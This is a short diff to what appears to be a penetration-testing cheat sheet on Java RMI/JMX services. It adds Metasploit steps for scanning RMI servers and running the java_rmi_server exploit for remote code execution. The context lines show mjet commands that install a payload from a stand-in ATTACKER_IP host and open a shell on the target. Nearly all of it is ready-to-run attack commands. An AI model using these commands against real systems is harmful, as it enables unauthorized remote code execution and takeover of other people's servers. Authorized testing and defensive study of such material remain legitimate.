@@ -64,6 +64,14 @@ $ rmg enum 172.17.0.2 9010
 [...]
 ```
 
+Using Metasploit
+```bash
+use auxiliary/scanner/misc/java_rmi_server
+set RHOSTS <IPs>
+set RPORT <PORT>
+run
+```
+
 ## Exploitation
 
 ### RCE using sjet or mjet
@@ -95,6 +103,15 @@ jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT
 jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000
 jython mjet.py TARGET_IP TARGET_PORT command super_secret "whoami"
 jython mjet.py TARGET_IP TARGET_PORT command super_secret shell
+```
+
+### RCE using Metasploit
+```bash
+use exploit/multi/misc/java_rmi_server
+set RHOSTS <IPs>
+set RPORT <PORT>
+# configure also the payload if needed
+run
 ```
 
 ## References
